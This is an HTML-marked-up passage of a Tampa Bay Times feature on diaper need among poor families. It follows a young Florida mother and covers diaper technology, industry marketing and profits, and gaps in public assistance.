&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_detail.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_detail.jpg 480w,//s3.amazonaws.com/ledejs/resized/diapers/600/diaper_detail.jpg 600w,//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_detail-2x.jpg 960w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_detail.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_detail-2x.jpg 1200w&quot; sizes=&quot;(min-width: 544px) 500px, 100vw&quot;/&gt;&lt;p&gt;Amound holds onto his father’s finger.&lt;/p&gt;
&lt;p class=&quot;section-break&quot;&gt;❖ ❖ ❖&lt;/p&gt;

&lt;p&gt;Industry insiders have a different perspective on diaper prices.&lt;/p&gt;
&lt;p&gt;“Given the technology that’s inside them,” consultant Heidi Beatty said, “they are super cheap.”&lt;/p&gt;
&lt;p&gt;Beatty spent a decade developing products for Johnson &amp;amp; Johnson. She considers diapers among the most sophisticated personal care items available today.&lt;/p&gt;

&lt;div id=&quot;diaperContainer&quot; class=&quot;fs&quot; readability=&quot;28&quot;&gt;
&lt;p&gt;The technology has one purpose: &lt;strong&gt;to absorb large amounts of liquid and feel dry moments later.&lt;/strong&gt;&lt;/p&gt;
&lt;div id=&quot;twenty&quot; class=&quot;scene diaperVideo&quot;&gt;&lt;img class=&quot;dGifs&quot; src=&quot;http://www.tampabay.com/projects/2018/features/baby-diaper-cost/Expandnew.gif&quot; alt=&quot;diaper layers&quot; width=&quot;100%&quot;/&gt;&lt;/div&gt;
&lt;p&gt;Peel a diaper apart and you’ll find &lt;strong&gt;three inner layers.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The first &lt;strong&gt;silky-soft layer&lt;/strong&gt; that touches the baby’s skin is made from an engineered textile called a nonwoven fabric.&lt;/p&gt;
&lt;div id=&quot;twentyone&quot; class=&quot;scene diaperVideo&quot;&gt;&lt;img class=&quot;dGifs&quot; src=&quot;http://www.tampabay.com/projects/2018/features/baby-diaper-cost/Layer1new.gif&quot; alt=&quot;diaper layers&quot; width=&quot;100%&quot;/&gt;&lt;/div&gt;
&lt;p&gt;It pulls urine into the diaper and then dries out, all while maintaining its fluffy texture. That’s important: A wet diaper feels cold. A cold baby cries.&lt;/p&gt;
&lt;p&gt;The second layer &lt;strong&gt;spreads the liquid across the diaper.&lt;/strong&gt; That prevents it from pooling, reducing the chance of diaper rash.&lt;/p&gt;
&lt;div id=&quot;twentythree&quot; class=&quot;scene diaperVideo&quot;&gt;&lt;img class=&quot;dGifs&quot; src=&quot;http://www.tampabay.com/projects/2018/features/baby-diaper-cost/Layer2new.gif&quot; alt=&quot;diaper layers&quot; width=&quot;100%&quot;/&gt;&lt;/div&gt;
&lt;p&gt;The third and most critical layer is the diaper’s core, usually made from a combination of wood pulp and a crystal-like substance called &lt;strong&gt;superabsorbent polymer, or SAP&lt;/strong&gt;.&lt;/p&gt;
&lt;div id=&quot;twentyfour&quot; class=&quot;scene diaperVideo&quot;&gt;&lt;img class=&quot;dGifs&quot; src=&quot;http://www.tampabay.com/projects/2018/features/baby-diaper-cost/Layer3new.gif&quot; alt=&quot;diaper layers&quot; width=&quot;100%&quot;/&gt;&lt;/div&gt;
&lt;p&gt;To the naked eye, &lt;strong&gt;SAP&lt;/strong&gt; looks like powder. A squirt of water turns it to gel.&lt;/p&gt;
&lt;div id=&quot;twentyfive&quot; class=&quot;scene diaperVideo&quot;&gt;&lt;img class=&quot;dGifs&quot; src=&quot;http://www.tampabay.com/projects/2018/features/baby-diaper-cost/Powdernew.gif&quot; alt=&quot;diaper layers&quot; width=&quot;100%&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;Scientists create SAP by linking molecules of acrylic acid into chains. The chains form a three-dimensional web that traps liquid and holds it in place.&lt;/p&gt;
&lt;p&gt;The more SAP, the less likely a diaper is to leak.&lt;/p&gt;
&lt;p&gt;Superabsorbent polymers made by the international chemical company BASF can absorb 300 to 500 times their weight in water, BASF technical specialist James Robinson said. They can absorb 50 to 70 times their weight in urine, which is more salty.&lt;/p&gt;
&lt;p&gt;Modern diapers also have a “breathable” backsheet that lets vapor but not liquid through. Flexible closures ensure a tight fit. Ultra-soft elastic waist and leg bands keep poop from seeping out.&lt;/p&gt;
&lt;p&gt;The technology helps keep babies healthy, according to the manufacturers. So does changing diapers often. Delays can lead to painful diaper rashes and infections. Frequently running low can affect a parent’s mental health, studies show.&lt;/p&gt;
&lt;p&gt;A single dad in Chicago — an ex-convict trying to turn his life around for his young daughter — &lt;a href=&quot;https://www.propublica.org/article/how-chicago-gets-its-guns&quot;&gt;told news website ProPublica Illinois&lt;/a&gt; that the only diapers he could afford came from the dollar store. They gave his baby hives.&lt;/p&gt;
&lt;p&gt;He grew desperate, and started working as a black-market gun broker.&lt;/p&gt;
&lt;p class=&quot;section-break&quot;&gt;❖ ❖ ❖&lt;/p&gt;

&lt;div class=&quot;fs&quot; readability=&quot;7&quot;&gt;&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1500/diapers_lalandria.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diapers_lalandria.jpg 500w, //s3.amazonaws.com/ledejs/resized/diapers/600/diapers_lalandria.jpg 700w, //s3.amazonaws.com/ledejs/resized/diapers/480/diapers_lalandria-2x.jpg 1000w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diapers_lalandria.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diapers_lalandria-2x.jpg 1400w, //s3.amazonaws.com/ledejs/resized/diapers/1500/diapers_lalandria.jpg 1500w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diapers_lalandria-2x.jpg 2048w, //s3.amazonaws.com/ledejs/resized/diapers/1500/diapers_lalandria-2x.jpg 3000w&quot;/&gt;&lt;p&gt;Lalandria changes Amound's diaper while her family gets ready for the day.&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;There was no question in Lalandria’s mind which diapers were best. She believed Huggies were the softest and most comfortable. The least likely to leak, too.&lt;/p&gt;
&lt;p&gt;Her feelings were no accident. Diaper companies spend billions on advertising and marketing. Procter &amp;amp; Gamble, which makes Pampers and Luvs, among other personal care and cleaning products, spent more than $7 billion on advertising in 2017 alone, according to its latest annual report — more than the GDP of any of the poorest 50 countries.&lt;/p&gt;
&lt;p&gt;Diaper companies also create their own web content, engage millennial moms on Pinterest and Instagram, and send freebies to “influencers” with thousands of social media followers.&lt;/p&gt;
&lt;p&gt;Each company has its own strategy. Kimberly-Clark, the maker of Huggies, markets “the emotion of motherhood” rather than the effectiveness of its diapers, said Maria Bailey, the Florida-based author of &lt;em&gt;Millennial Moms.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;“A lot of their advertising focuses on the fact that we know you’ve been up all night, we know that you are tired,” Bailey said.&lt;/p&gt;
&lt;p&gt;The brand is also cashing in on successful campaigns from the 1980s and ’90s, Bailey said. That’s because millennial women look to their mothers for product recommendations.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;tweetline&quot; data-tweet=&quot;Jennifer was a Huggies mom. Lalandria wanted to be, too.&quot; data-story=&quot;Jennifer was a Huggies mom. Lalandria wanted to be, too.&quot;&gt;Jennifer was a Huggies mom. Lalandria wanted to be, too.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;There was usually no money for that.&lt;/p&gt;
&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_budget.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_budget.jpg 480w,//s3.amazonaws.com/ledejs/resized/diapers/600/diaper_budget.jpg 600w,//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_budget-2x.jpg 960w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_budget.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_budget-2x.jpg 1200w&quot; sizes=&quot;(min-width: 544px) 500px, 100vw&quot;/&gt;&lt;p&gt;Budget diapers are less expensive than premium brands, but often don’t last as long.&lt;/p&gt;
&lt;p&gt;Jennifer bought diapers and wipes whenever she could. She was working at Publix and could pick them up after a shift. Still, Lalandria never had enough.&lt;/p&gt;
&lt;p&gt;“God will make a way,” she told herself.&lt;/p&gt;
&lt;p&gt;Lalandria gradually adjusted her routine. Instead of reaching for a new diaper whenever the indicator strip changed color, she waited until the diaper started to sag.&lt;/p&gt;
&lt;p&gt;One evening, just before Amound’s one-month checkup in May, Lalandria's grandmother noticed red splotches on his bottom.&lt;/p&gt;
&lt;p&gt;“Diaper rash,” she said.&lt;/p&gt;
&lt;p&gt;Lalandria dabbed cream on it until it disappeared.&lt;/p&gt;
&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_mom18.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_mom18.jpg 480w,//s3.amazonaws.com/ledejs/resized/diapers/600/diaper_mom18.jpg 600w,//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_mom18-2x.jpg 960w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_mom18.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_mom18-2x.jpg 1200w&quot; sizes=&quot;(min-width: 544px) 500px, 100vw&quot;/&gt;&lt;p&gt;John and Lalandria take Amound to the doctor.&lt;/p&gt;
&lt;p&gt;The pressure had John and Lalandria fighting. He started spending less time at the townhouse. Lalandria was off bedrest now, but kept to her bedroom, the curtains drawn, the baby beside her.&lt;/p&gt;
&lt;p&gt;At a checkup, a doctor asked Lalandria if she was stressed or anxious.&lt;/p&gt;
&lt;p&gt;“Both,” Lalandria replied.&lt;/p&gt;
&lt;p&gt;The diagnosis was postpartum depression.&lt;/p&gt;
&lt;p class=&quot;section-break&quot;&gt;❖ ❖ ❖&lt;/p&gt;

&lt;p&gt;Disposable diapers weren’t widely available until 1961, when Procter &amp;amp; Gamble introduced Pampers. More than a decade later, the company had its first serious competitor: Kimberly-Clark’s Huggies.&lt;/p&gt;
&lt;p&gt;Things got ugly. In 1986, Procter &amp;amp; Gamble sued Kimberly-Clark, claiming the company was illegally using its patented elastic-waistband technology. Kimberly-Clark said the idea was obvious, and moved to have the patent invalidated.&lt;/p&gt;
&lt;p&gt;Kimberly-Clark won the battle. But the nation’s top two diaper companies continued to duke it out in court for years. The fight was so bitter, insiders called it the “diaper wars.”&lt;/p&gt;
&lt;p&gt;Today, Kimberly-Clark and Procter &amp;amp; Gamble compete alongside some two dozen generic brands sold at grocery stores, toy stores and supercenters.&lt;/p&gt;
&lt;p&gt;The newest players are startups targeting high-income parents. Many market themselves as natural alternatives. The Honest Company, founded by actor Jessica Alba, uses sustainably harvested pulp in its diapers. Parasol’s are hypoallergenic, chlorine-free, fragrance-free, lotion-free, latex-free, and free of lead and heavy metals. Poof says its diapers are fully biodegradable and couture inspired.&lt;/p&gt;
&lt;p&gt;Companies large and small keep their designs and production processes secret. Visitors aren’t allowed in factories.&lt;/p&gt;
&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_baby.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_baby.jpg 480w,//s3.amazonaws.com/ledejs/resized/diapers/600/diaper_baby.jpg 600w,//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_baby-2x.jpg 960w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_baby.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_baby-2x.jpg 1200w&quot; sizes=&quot;(min-width: 544px) 500px, 100vw&quot;/&gt;&lt;p&gt;Newborns need as many as 12 diaper changes a day.&lt;/p&gt;
&lt;p&gt;The &lt;em&gt;Tampa Bay Times&lt;/em&gt; reached out to five companies, hoping to talk about the business of baby diapers. Kimberly-Clark and Honest offered to discuss charitable giving, but not design, engineering or manufacturing. Procter &amp;amp; Gamble was one of three companies that didn’t return calls or emails.&lt;/p&gt;
&lt;p&gt;The top manufacturers don’t publicly report profit margins on their diapers, and many insiders won’t discuss the bottom line. Consultant Carlos Richer, who ran a large diaper factory in Mexico, joked he would become “the enemy of the diaper industry” if he did.&lt;/p&gt;
&lt;p&gt;Carl Cucuzza, a consultant based in Georgia, said Huggies and Pampers typically make about 2 cents per diaper. The profit on a generic diaper, he said, is about half that.&lt;/p&gt;
&lt;p&gt;It’s “good money,” he added. Billions of diapers are sold annually.&lt;/p&gt;
&lt;p&gt;Business will likely get better.&lt;/p&gt;
&lt;p&gt;At the conference in Austin, industry leaders discussed ways to make their diapers fancier. More environmentally friendly. And thinner — both for the baby’s comfort and to fit more packages on grocery store shelves.&lt;/p&gt;
&lt;p&gt;There were no panels on bringing down the price, or diaper affordability.&lt;/p&gt;
&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_conv4.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_conv4.jpg 480w,//s3.amazonaws.com/ledejs/resized/diapers/600/diaper_conv4.jpg 600w,//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_conv4-2x.jpg 960w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_conv4.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_conv4-2x.jpg 1200w&quot; sizes=&quot;(min-width: 544px) 500px, 100vw&quot;/&gt;&lt;p&gt;Hygienix conference attendees listen to a speaker in Austin.&lt;/p&gt;
&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_conv5.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_conv5.jpg 480w,//s3.amazonaws.com/ledejs/resized/diapers/600/diaper_conv5.jpg 600w,//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_conv5-2x.jpg 960w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_conv5.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_conv5-2x.jpg 1200w&quot; sizes=&quot;(min-width: 544px) 500px, 100vw&quot;/&gt;&lt;p&gt;At the conference, Huggies shows off its latest product: diapers for “micro-preemies” weighing two pounds or less.&lt;/p&gt;
&lt;p&gt;Richer said later that some Latin American companies sell reliable diapers for 10 cents. But companies in the United States, he said, “have not been interested in selling to that particular population.”&lt;/p&gt;
&lt;p&gt;“In order to make more money, you have to make a more sophisticated product,” he said.&lt;/p&gt;
&lt;p&gt;Asked why affordability was not on the schedule, Dave Rousse, the president of the nonwoven fabrics industry association, which organized the conference, said it was up to diaper companies to determine “the level of support they are going to give to that sector.”&lt;/p&gt;
&lt;p&gt;Rousse said there are value-priced diapers on the U.S. market, and pointed out that manufacturers like Kimberly-Clark and Procter &amp;amp; Gamble donate millions of diapers each year. The Huggies brand commissioned a study on diaper need and is a founding sponsor of the National Diaper Bank Network.&lt;/p&gt;
&lt;p&gt;But, Rousse said, “a disposable product for a family that has financial burdens is sometimes a stretch. Sometimes, they need to reconsider how they meet their needs.”&lt;/p&gt;
&lt;p class=&quot;section-break&quot;&gt;❖ ❖ ❖&lt;/p&gt;

&lt;div class=&quot;fs&quot; readability=&quot;7&quot;&gt;&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1500/diaper_mom1.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_mom1.jpg 500w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_mom1.jpg 700w, //s3.amazonaws.com/ledejs/resized/diapers/480/diaper_mom1-2x.jpg 1000w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_mom1.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_mom1-2x.jpg 1400w, //s3.amazonaws.com/ledejs/resized/diapers/1500/diaper_mom1.jpg 1500w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_mom1-2x.jpg 2048w, //s3.amazonaws.com/ledejs/resized/diapers/1500/diaper_mom1-2x.jpg 3000w&quot;/&gt;&lt;p&gt;Lalandria takes a nap with Amound in her bedroom in August.&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;Later in May, for the first time since the baby arrived, it looked like Lalandria’s life might get easier. John had been hired part time at a Family Dollar. Not only would he have a paycheck, he could buy discount diapers and wipes.&lt;/p&gt;
&lt;p&gt;The relief was short lived. In June, their case manager delivered bad news. John’s $10-an-hour job meant they no longer qualified for cash assistance.&lt;/p&gt;
&lt;p&gt;Suddenly there was far less money for diapers.&lt;/p&gt;
&lt;p&gt;Most families living below the poverty line rely on a patchwork of government assistance programs: Medicaid for health insurance; food stamps; and a program that provides healthy food to women, infants and children, known as WIC.&lt;/p&gt;
&lt;p&gt;Cash assistance is the only one that can go toward diapers, wipes and other essential baby supplies that aren’t food.&lt;/p&gt;
&lt;p&gt;Florida’s cash assistance program requires recipients to be employed or looking for work. But a family of three also can’t make more than $303, the maximum monthly benefit.&lt;/p&gt;
&lt;p&gt;For Lalandria, John’s new job meant the family made too much.&lt;/p&gt;
&lt;p&gt;Lalandria had already been looking for work, but that week, she stepped up her efforts. She applied for call-center jobs, cleaning jobs, fast-food jobs. Nothing worked out.&lt;/p&gt;
&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_mom5.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_mom5.jpg 480w,//s3.amazonaws.com/ledejs/resized/diapers/600/diaper_mom5.jpg 600w,//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_mom5-2x.jpg 960w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_mom5.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_mom5-2x.jpg 1200w&quot; sizes=&quot;(min-width: 544px) 500px, 100vw&quot;/&gt;&lt;p&gt;Lalandria waits for the bus to take her to a job interview in June.&lt;/p&gt;
&lt;p&gt;The heat and humidity was making everyone cranky, including Amound. One afternoon, he started wailing for no obvious reason. She rocked him, offered him his pacifier. He cried louder.&lt;/p&gt;
&lt;p&gt;Lalandria didn’t know what to do. It wasn’t just the screaming baby, or the lack of sleep, or the fact John had hardly been around. Every day, she was running out of something Amound needed.&lt;/p&gt;
&lt;p&gt;She started the familiar retreat to her bedroom, where she could draw the curtains and hide. But halfway up the stairs, with the baby in her arms, she sat down and cried.&lt;/p&gt;
&lt;p class=&quot;section-break&quot;&gt;❖ ❖ ❖&lt;/p&gt;

&lt;p&gt;Experts call diaper need a “silent crisis.”&lt;/p&gt;
&lt;p&gt;“People don’t talk about having enough diapers,” said Alison Weir, who oversees policy and research at the National Diaper Bank Network. “It’s embarrassing. But it is such a basic need. If you aren’t actively changing diapers, you don’t think about it.”&lt;/p&gt;
&lt;p&gt;In March 2016, it caught the attention of the White House.&lt;/p&gt;
&lt;p&gt;In a blog post, an advisor to then-President Barack Obama pointed out that families can be forced to choose between buying diapers and paying for food, rent or utilities.&lt;/p&gt;
&lt;p&gt;“That’s a choice that no family should have to make,” she wrote.&lt;/p&gt;
&lt;p&gt;Obama urged Congress to devote $10 million to the problem. Congress did nothing.&lt;/p&gt;
&lt;p&gt;Some states have taken action. In California, Democratic Gov. Jerry Brown recently approved $30 in monthly diaper benefits for families in the state’s cash welfare-to-work program.&lt;/p&gt;
&lt;p&gt;In Florida, the number of families receiving cash assistance has dropped from 214,000 to 48,000 since 1995, even as the number of poor families has increased, according to the Center on Budget and Policy Priorities. The benefit for a family of three has stayed the same.&lt;/p&gt;
&lt;p&gt;Florida lawmakers have considered eliminating the sales tax on baby diapers for the last two years. The savings would amount to about $50 annually for the average family, according to Sen. Lauren Book, a Democrat from Plantation who sponsored both bills.&lt;/p&gt;
&lt;p&gt;This year and last, the idea won support early in the legislative session. Both years, it stalled out.&lt;/p&gt;
&lt;p&gt;Several nonprofits are trying to fill the gap. The Tampa Bay region has at least two diaper banks: &lt;a href=&quot;http://www.babycyclefl.org&quot; target=&quot;_blank&quot;&gt;Babycycle&lt;/a&gt; in St. Petersburg and the &lt;a href=&quot;http://www.herewegrowfoundation.com&quot; target=&quot;_blank&quot;&gt;Here We Grow Foundation&lt;/a&gt; in Clearwater.&lt;/p&gt;
&lt;p&gt;Babycycle distributes about 250,000 diapers and wipes to social service providers annually. But some agencies get fewer than they request, and others are on a waiting list.&lt;/p&gt;
&lt;p&gt;Here We Grow gives directly to about 250 families each year. Program director Meredith Scott, a mother who once ran out of diapers herself, said she doesn’t have enough to keep up with the need.&lt;/p&gt;
&lt;p class=&quot;section-break&quot;&gt;❖ ❖ ❖&lt;/p&gt;

&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1500/diaper_mom16.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_mom16.jpg 480w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_mom16.jpg 600w, //s3.amazonaws.com/ledejs/resized/diapers/480/diaper_mom16-2x.jpg 960w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_mom16.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_mom16-2x.jpg 1200w, //s3.amazonaws.com/ledejs/resized/diapers/1500/diaper_mom16.jpg 1500w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_mom16-2x.jpg 2048w, //s3.amazonaws.com/ledejs/resized/diapers/1500/diaper_mom16-2x.jpg 3000w&quot; sizes=&quot;(min-width: 544px and max-width: 767px) 85vw, (min-width: 768px) 75vw, 100vw&quot;/&gt;&lt;p&gt;Lalandria pauses in the middle of a busy day caring for her infant son.&lt;/p&gt;
&lt;p&gt;Lalandria’s mother found her on the stairs that day, crying.&lt;/p&gt;
&lt;p&gt;Jennifer Goolsby set down her purse.&lt;/p&gt;
&lt;p&gt;“You need to find the strength to help him,” Jennifer said. “You have to fight.”&lt;/p&gt;
&lt;p&gt;Late that afternoon, while Amound napped, Jennifer and Lalandria devised a strategy to clip coupons and find the best deals on diapers. They came up with a long-term plan, too. Lalandria would keep applying for jobs. When she found work, Jennifer would change her own work schedule so she could watch the baby. And when Lalandria saved up enough money, she would find a place of her own.&lt;/p&gt;
&lt;p&gt;Weeks later, Lalandria walked into restaurant in the final phases of construction in Pinellas Park. She walked out with a job.&lt;/p&gt;
&lt;p&gt;At one of her first shifts, she stood behind the counter and greeted everyone who came through the doors.&lt;/p&gt;
&lt;p&gt;“Welcome to Culver’s!”&lt;/p&gt;
&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_mom3.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_mom3.jpg 480w,//s3.amazonaws.com/ledejs/resized/diapers/600/diaper_mom3.jpg 600w,//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_mom3-2x.jpg 960w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_mom3.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_mom3-2x.jpg 1200w&quot; sizes=&quot;(min-width: 544px) 500px, 100vw&quot;/&gt;&lt;p&gt;Lalandria rings up an order as a cashier at Culver’s in Pinellas Park.&lt;/p&gt;
&lt;p&gt;Days into the job, Lalandria felt different. She knew that $8.25 an hour wouldn’t go far. She planned to give most of it to her mom, anyway. But she looked forward to helping with the bills again. She might even have a few dollars for new clothes, or a night out with friends.&lt;/p&gt;
&lt;p&gt;Things felt different at home, too. Amound hadn’t stopped crying; a tooth poked through his pink gums. But he was sleeping through the night. And he smiled and cooed more.&lt;/p&gt;
&lt;p&gt;Lalandria still thought about California. She wanted to get a better job first. Maybe she would get certified as a home health aide or a nursing assistant, or go back to school.&lt;/p&gt;
&lt;p&gt;For now, she was content with small victories.&lt;/p&gt;
&lt;p&gt;A few days later, Lalandria found herself in the diaper aisle at her neighborhood grocery store. She knew just what she wanted. She wiggled a pack from the shelf, paid cash, and left.&lt;/p&gt;
&lt;p&gt;Tonight, she was bringing home Huggies.&lt;/p&gt;

&lt;div class=&quot;fs&quot; readability=&quot;7&quot;&gt;&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1500/diaper_ender.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_ender.jpg 500w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_ender.jpg 700w, //s3.amazonaws.com/ledejs/resized/diapers/480/diaper_ender-2x.jpg 1000w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_ender.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_ender-2x.jpg 1400w, //s3.amazonaws.com/ledejs/resized/diapers/1500/diaper_ender.jpg 1500w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_ender-2x.jpg 2048w, //s3.amazonaws.com/ledejs/resized/diapers/1500/diaper_ender-2x.jpg 3000w&quot;/&gt;&lt;p&gt;Lalandria gazes at Amound as he sleeps.&lt;/p&gt;
&lt;/div&gt;
&lt;h3&gt;How to help&lt;/h3&gt;
&lt;div class=&quot;sans&quot; readability=&quot;10.939024390244&quot;&gt;
&lt;p&gt;Diaper banks are nonprofit organizations that provide free baby diapers and wipes to families in need. Some distribute directly to families; others work with social service agencies. The National Diaper Bank Network recognizes two in the Tampa Bay area. Both are seeking donations.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;intro&quot;&gt;Babycycle&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;(727) 256-3708&lt;br/&gt;&lt;a href=&quot;http://www.babycyclefl.org&quot; target=&quot;_blank&quot;&gt;www.babycyclefl.org&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;intro&quot;&gt;Here We Grow Foundation&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;(727) 734-4841&lt;br/&gt;&lt;a href=&quot;http://www.herewegrowfoundation.com&quot; target=&quot;_blank&quot;&gt;www.herewegrowfoundation.com&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;http://www.tampabay.com/cdn-cgi/l/email-protection#ea828f988f9d8f8d98859d8c859f848e8b9e838584aa93878b8386c4898587&quot; target=&quot;_blank&quot;&gt;&lt;span class=&quot;__cf_email__&quot; data-cfemail=&quot;adc5c8dfc8dac8cadfc2dacbc2d8c3c9ccd9c4c2c3edd4c0ccc4c183cec2c0&quot;&gt;[email protected]&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;about&quot; readability=&quot;8.8651315789474&quot;&gt;
&lt;p&gt;Contact Kathleen McGrory at &lt;a href=&quot;http://www.tampabay.com/cdn-cgi/l/email-protection#a6cdcbc5c1d4c9d4dfe6d2c7cbd6c7c4c7df88c5c9cb&quot;&gt;&lt;span class=&quot;__cf_email__&quot; data-cfemail=&quot;5833353b3f2a372a21182c393528393a3921763b3735&quot;&gt;[email protected]&lt;/span&gt;&lt;/a&gt;. Follow &lt;a href=&quot;https://twitter.com/kmcgrory&quot; target=&quot;_blank&quot;&gt;@kmcgrory&lt;/a&gt;. Contact Eve Edelheit at &lt;a href=&quot;http://www.tampabay.com/cdn-cgi/l/email-protection#b1d4d4d5d4ddd9d4d8c5f1c5d0dcc1d0d3d0c89fd2dedc&quot;&gt;&lt;span class=&quot;__cf_email__&quot; data-cfemail=&quot;70151514151c181519043004111d00111211095e131f1d&quot;&gt;[email protected]&lt;/span&gt;&lt;/a&gt;. Follow &lt;a href=&quot;https://twitter.com/eve_edelheit&quot;&gt;@eve_edelheit.&lt;/a&gt; This story was written with the support of the National Health Journalism Fellowship, a program of the University of Southern California’s Annenberg School of Journalism.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;credits&quot;&gt;
&lt;h4&gt;Additional credits&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;&lt;span class=&quot;title&quot;&gt;Video production&lt;/span&gt; &lt;span class=&quot;names&quot;&gt;Eve Edelheit&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&quot;title&quot;&gt;Photo editing&lt;/span&gt; &lt;span class=&quot;names&quot;&gt;Patty Yablonski&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&quot;title&quot;&gt;Story design&lt;/span&gt; &lt;span class=&quot;names&quot;&gt;Lyra Solochek and Lauren Flannery&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&quot;title&quot;&gt;Graphic illustration&lt;/span&gt; &lt;span class=&quot;names&quot;&gt;Eli Zhang and Lauren Flannery&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;



&lt;div class=&quot;subscriptionContainer&quot; readability=&quot;7&quot;&gt;

&lt;p&gt;TOTAL DIGITAL ACCESS $1/WEEK&lt;/p&gt;
&lt;img class=&quot;logo&quot; src=&quot;http://www.tampabay.com/pb/resources/assets/logos/tampabaytimes_black.svg&quot;/&gt;&lt;/div&gt;



&lt;h4 class=&quot;fs&quot;&gt;Read these next&lt;/h4&gt;
&lt;div class=&quot;read-more-cards card-count-3&quot; id=&quot;read-more&quot; readability=&quot;9.5&quot;&gt;
&lt;div class=&quot;cards cards-container&quot; readability=&quot;14&quot;&gt;

&lt;h4 class=&quot;read-more-head&quot;&gt;Told in Legos&lt;/h4&gt;
&lt;p class=&quot;read-more-graf&quot;&gt;The plan to fix Tampa Bay's most important bridge fell apart. Here’s why.&lt;/p&gt;


&lt;h4 class=&quot;read-more-head&quot;&gt;Hot Wheels&lt;/h4&gt;
